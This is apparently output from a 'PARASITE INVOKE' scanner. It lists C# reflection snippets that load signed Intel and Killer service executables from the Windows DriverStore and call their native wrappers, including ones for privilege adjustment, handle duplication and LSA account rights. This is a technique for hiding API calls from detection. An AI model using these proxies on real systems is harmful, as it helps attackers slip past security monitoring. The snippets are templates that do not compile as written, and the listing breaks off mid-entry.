        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovControl.WovControlMethods"", true);
        var methodInfo = t.GetMethod(""IsLpCapableDevice"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntelWovSafeHandle _wovControllerPtr, string _deviceId });
        ===END SIGNATURE===

Method: GetFirstLpCapableArrayEndpointId
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovControl.WovControlMethods"", true);
        var methodInfo = t.GetMethod(""GetFirstLpCapableArrayEndpointId"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelWovSafeHandle _wovControllerPtr, bool _ppCapable, String& _endpointId });
        ===END SIGNATURE===

Method: GetActiveEndpointId
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovControl.WovControlMethods"", true);
        var methodInfo = t.GetMethod(""GetActiveEndpointId"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelWovSafeHandle _wovControllerPtr, String& _endpointId });
        ===END SIGNATURE===

Method: GetMicArray
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovControl.WovControlMethods"", true);
        var methodInfo = t.GetMethod(""GetMicArray"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntelWovSafeHandle _wovControllerPtr, KSAUDIO_MIC_ARRAY_GEOMETRY_WRAPPER& _geometry });
        ===END SIGNATURE===

Method: LoadKsPipeline
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovControl.WovControlMethods"", true);
        var methodInfo = t.GetMethod(""LoadKsPipeline"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelWovSafeHandle _wovControllerPtr, uint _micChannelsCount, uint _referenceChannelsCount, ushort _bitDepth, ushort _containerSize, eIntcSpeechMode _mode, bool _preprocessed, uint _ksMicCoordArrayLen, Boolean& _usesPpDll });
        ===END SIGNATURE===

Method: GetKsStatus
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovControl.WovControlMethods"", true);
        var methodInfo = t.GetMethod(""GetKsStatus"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntelWovSafeHandle _wovControllerPtr, Boolean& _areWovNotificationsEnabled, Boolean& _isPreprocessingEnabled, UInt32& _micChannelsCount, UInt32& _referenceChannelsCount, UInt32& _ksMicCoordArrayLen, UInt16& _bitDepth, UInt16& _containerSize, EndpointDeviceData& _defaultDevice, string _queriedDevice });
        ===END SIGNATURE===

Method: CreateIOCTLControlInstance
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.Ioctl.IoctlMethods"", true);
        var methodInfo = t.GetMethod(""CreateIOCTLControlInstance"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        IntelAudioService.ControlModuleWrapper.Ioctl.IntelIOCTLSafeHandle result = (IntelAudioService.ControlModuleWrapper.Ioctl.IntelIOCTLSafeHandle) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: CreateHpalIOCTLControlInstance
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.Ioctl.IoctlMethods"", true);
        var methodInfo = t.GetMethod(""CreateHpalIOCTLControlInstance"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        IntelAudioService.ControlModuleWrapper.Ioctl.IntelIOCTLSafeHandle result = (IntelAudioService.ControlModuleWrapper.Ioctl.IntelIOCTLSafeHandle) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: DisposeIOCTLControl
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.Ioctl.IoctlMethods"", true);
        var methodInfo = t.GetMethod(""DisposeIOCTLControl"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntPtr _ioctlHandle });
        ===END SIGNATURE===

Method: GetTinyParameter
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.Ioctl.IoctlMethods"", true);
        var methodInfo = t.GetMethod(""GetTinyParameter"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntelIOCTLSafeHandle _ioctlHandle, uint _feature, uint _parameterId, UInt32& _parameterData });
        ===END SIGNATURE===

Method: SetTinyParameter
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.Ioctl.IoctlMethods"", true);
        var methodInfo = t.GetMethod(""SetTinyParameter"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntelIOCTLSafeHandle _ioctlHandle, uint _feature, uint _parameterId, uint _parameterData, bool _setAsDefault });
        ===END SIGNATURE===

Method: GetBigParameter
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.Ioctl.IoctlMethods"", true);
        var methodInfo = t.GetMethod(""GetBigParameter"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntelIOCTLSafeHandle _ioctlHandle, uint _feature, uint _parameterId, IntPtr& _dataBlob, UInt64& _dataBlobSize });
        ===END SIGNATURE===

Method: SetBigParameter
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.Ioctl.IoctlMethods"", true);
        var methodInfo = t.GetMethod(""SetBigParameter"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntelIOCTLSafeHandle _ioctlHandle, uint _feature, uint _parameterId, IntPtr _dataBlob, ulong _dataBlobSize });
        ===END SIGNATURE===

Method: GetStructParameter
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.Ioctl.IoctlMethods"", true);
        var methodInfo = t.GetMethod(""GetStructParameter"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntelIOCTLSafeHandle _ioctlHandle, uint _ioctlCode, uint _featureId, IntPtr& _data, uint _dataSize });
        ===END SIGNATURE===

Method: GetDevicePath
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.Ioctl.IoctlMethods"", true);
        var methodInfo = t.GetMethod(""GetDevicePath"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelIOCTLSafeHandle _ioctlHandle, IntPtr& _devName });
        ===END SIGNATURE===

Method: GetProcessWorkingSetSizeExExport
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.Core.Win32NativeMethods"", true);
        var methodInfo = t.GetMethod(""GetProcessWorkingSetSizeExExport"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr _hProcess, Int32& _minWorkingSetSize, Int32& _maxWorkingSetSize, QUOTA_LIMITS_HARDWS& Flags });
        ===END SIGNATURE===

Method: SetProcessWorkingSetSizeExExport
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.Core.Win32NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetProcessWorkingSetSizeExExport"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr _hProcess, int _minWorkingSetSize, int _maxWorkingSetSize, QUOTA_LIMITS_HARDWS Flags });
        ===END SIGNATURE===

Method: DuplicateHandleExport
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.Core.Win32NativeMethods"", true);
        var methodInfo = t.GetMethod(""DuplicateHandleExport"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { uint _callerPid, IntPtr _wupEvent });
        ===END SIGNATURE===

Method: CloseHandleExport
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.Core.Win32NativeMethods"", true);
        var methodInfo = t.GetMethod(""CloseHandleExport"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hObject });
        ===END SIGNATURE===

Method: CallNtPowerInformationExport
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.Core.WinAPINativeMethods"", true);
        var methodInfo = t.GetMethod(""CallNtPowerInformationExport"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { int InformationLevel, IntPtr lpInputBuffer, int nInputBufferSize, SYSTEM_POWER_CAPABILITIES& spi, int nOutputBufferSize });
        ===END SIGNATURE===

Method: RegisterServiceCtrlHandlerExWExport
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.Core.WinAPINativeMethods"", true);
        var methodInfo = t.GetMethod(""RegisterServiceCtrlHandlerExWExport"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { string lpServiceName, ServiceControlHandlerEx cbex, IntPtr context });
        ===END SIGNATURE===

Method: RegisterPowerSettingNotificationExport
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.Core.WinAPINativeMethods"", true);
        var methodInfo = t.GetMethod(""RegisterPowerSettingNotificationExport"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr hRecipient, Guid& PowerSettingGuid, int Flags });
        ===END SIGNATURE===

Method: UnregisterPowerSettingNotificationExport
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.Core.WinAPINativeMethods"", true);
        var methodInfo = t.GetMethod(""UnregisterPowerSettingNotificationExport"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr handle });
        ===END SIGNATURE===

Method: AdjustSecurityPrivileges
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.Core.WinAPINativeMethods"", true);
        var methodInfo = t.GetMethod(""AdjustSecurityPrivileges"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: IsApiSetImplementedExport
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.Core.WinAPINativeMethods"", true);
        var methodInfo = t.GetMethod(""IsApiSetImplementedExport"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { string _apiSetName });
        ===END SIGNATURE===

Method: IsPowerManagmentApiSetImplementedExport
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.Core.WinAPINativeMethods"", true);
        var methodInfo = t.GetMethod(""IsPowerManagmentApiSetImplementedExport"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: CreateAcaDetectorDllClientInstance
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Aca.AcaDetectorDll.AcaDetectorDllMethods"", true);
        var methodInfo = t.GetMethod(""CreateAcaDetectorDllClientInstance"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        IntelAudioService.Aca.AcaDetectorDll.AcaDetectorDllSafeHandle result = (IntelAudioService.Aca.AcaDetectorDll.AcaDetectorDllSafeHandle) methodInfo.Invoke(null, new object[] { string _acaDetectorDllPath });
        ===END SIGNATURE===

Method: DisposeAcaDetectorDllClient
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Aca.AcaDetectorDll.AcaDetectorDllMethods"", true);
        var methodInfo = t.GetMethod(""DisposeAcaDetectorDllClient"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntPtr _acaDetectorDllHandle });
        ===END SIGNATURE===

Method: ACADetectorGetCaps
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Aca.AcaDetectorDll.AcaDetectorDllMethods"", true);
        var methodInfo = t.GetMethod(""ACADetectorGetCaps"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { AcaDetectorDllSafeHandle _acaDllHandle, string _acaIpPath, IntPtr _acaIpSoundsList });
        ===END SIGNATURE===

Method: ACADetectorBuildArmingData
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Aca.AcaDetectorDll.AcaDetectorDllMethods"", true);
        var methodInfo = t.GetMethod(""ACADetectorBuildArmingData"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { AcaDetectorDllSafeHandle _acaDllHandle, Guid _moduleId, IntPtr _acaList, IntPtr _acaConfList });
        ===END SIGNATURE===

Method: ACADetectorVerifyDetection
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Aca.AcaDetectorDll.AcaDetectorDllMethods"", true);
        var methodInfo = t.GetMethod(""ACADetectorVerifyDetection"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { AcaDetectorDllSafeHandle _acaDllHandle, Guid _moduleId, uint _inputBufSize, IntPtr _buf, UInt64& _startPcValue, UInt64& _endPcValue, IntPtr _acaDetection });
        ===END SIGNATURE===

Method: GetAcaDetectorApiVersion
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Aca.AcaDetectorDll.AcaDetectorDllMethods"", true);
        var methodInfo = t.GetMethod(""GetAcaDetectorApiVersion"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { AcaDetectorDllSafeHandle _acaDllHandle, UInt32& _major, UInt32& _minor });
        ===END SIGNATURE===

Method: GetLibraryVersion
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Aca.AcaDetectorDll.AcaDetectorDllMethods"", true);
        var methodInfo = t.GetMethod(""GetLibraryVersion"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { AcaDetectorDllSafeHandle _acaDllHandle, UInt32& _major, UInt32& _minor, UInt32& _build, UInt32& _revision });
        ===END SIGNATURE===
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KAPSService.exe

Method: ChangeServiceConfig2
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KAPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""ChangeServiceConfig2"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hService, SERVICE_CONFIG_INFOLEVEL dwInfoLevel, IntPtr lpInfo });
        ===END SIGNATURE===

Method: ChangeServiceConfig2
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KAPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""ChangeServiceConfig2"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hService, SERVICE_CONFIG_INFOLEVEL dwInfoLevel, SERVICE_FAILURE_ACTIONS& sfa });
        ===END SIGNATURE===

Method: OpenSCManager
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KAPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""OpenSCManager"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { string machineName, string databaseName, uint dwAccess });
        ===END SIGNATURE===

Method: OpenService
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KAPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""OpenService"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess });
        ===END SIGNATURE===

Method: CloseServiceHandle
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KAPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""CloseServiceHandle"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hSCObject });
        ===END SIGNATURE===

Method: SetServiceStatus
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KAPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""SetServiceStatus"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hServiceStatus, SERVICE_STATUS& lpServiceStatus });
        ===END SIGNATURE===

Method: LsaOpenPolicy
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KAPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LsaOpenPolicy"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { LSA_UNICODE_STRING& SystemName, LSA_OBJECT_ATTRIBUTES& ObjectAttributes, int DesiredAccess, IntPtr& PolicyHandle });
        ===END SIGNATURE===

Method: LsaAddAccountRights
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KAPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LsaAddAccountRights"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr PolicyHandle, IntPtr AccountSid, LSA_UNICODE_STRING[] UserRights, uint CountOfRights });
        ===END SIGNATURE===

Method: FreeSid
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KAPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""FreeSid"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntPtr pSid });
        ===END SIGNATURE===

Method: LookupAccountName
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KAPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LookupAccountName"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { string lpSystemName, string lpAccountName, IntPtr psid, Int32& cbsid, StringBuilder domainName, Int32& cbdomainLength, Int32& use });
        ===END SIGNATURE===

Method: IsValidSid
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KAPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""IsValidSid"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr pSid });
        ===END SIGNATURE===

Method: LsaClose
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KAPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LsaClose"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr ObjectHandle });
        ===END SIGNATURE===

Method: LsaNtStatusToWinError
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KAPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LsaNtStatusToWinError"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { uint status });
        ===END SIGNATURE===

Method: SetStdHandle
        ===PARASITE INVOKE SIGNATURE===
